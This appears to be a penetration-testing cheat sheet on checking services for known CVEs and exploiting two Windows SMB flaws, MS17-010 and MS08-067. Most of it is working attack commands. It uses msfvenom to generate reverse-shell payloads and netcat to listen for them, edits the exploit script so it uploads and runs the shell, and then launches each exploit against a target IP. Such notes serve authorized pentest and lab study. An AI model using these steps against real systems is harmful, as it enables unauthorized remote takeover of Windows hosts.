# Exploit & CVE

**Check services vulnerabilities**

After gathering information about the system and their version in all the ports, it is necessary to check if a public exploit exist on one of the service exposed on the network.\
If you found an exploit, read it and add the necessary modifications before to launch it.

* Nmap NSE vuln category modules : `sudo nmap <OPTION> --script vuln <IP>`
* Use `searchsploit <TOOL> <VERSION>`
  * `searchsploit --nmap <NMAPOUTPUT.XML>` the XML file has been generated by nmap with the `-sV` option.
* You can import nmap output to metasploit database doing `db_import <NMAPOUTPUT.xml>` (`postgresql` service need to be started) and use the `vulns` command.
* Use `pompem` WiP
* Search on browser
  * GitHub
  * CVEDetails

**MS17-010 (CVE-2017-0143)**

*   Exploit: `/usr/share/exploitdb/exploits/windows/remote/42315.py`

    * Dependency: [https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py](https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py)
    * Modify `USERNAME='//'`
    * Modify

    ```
    smb_send_file(smbConn, '/<PATH>/<REVERSE_SHELL>.exe', 'C', '/<REVERSE_SHELL>.exe')
    service_exec(conn, r'cmd /c c:\\<REVERSE_SHELL>.exe')
    ```
* Generate the shell code: `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe > <REVERSE_SHELL>.exe`
* Listen: `nc -nlvp <PORT>`
* Run the exploit: `python 42315.py <IP> ntsvcs`

**MS08-067 (CVE-2008-4250)**

* Exploit: [https://raw.githubusercontent.com/jivoi/pentest/master/exploit\\\_win/ms08-067.py](https://raw.githubusercontent.com/jivoi/pentest/master/exploit/\_win/ms08-067.py)
* Generate the shell code: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c -a x86 --platform windows`
* Listen: `nc -nlvp <PORT>`
* Run the exploit: `python ms08-067.py <IP> <PORT>`
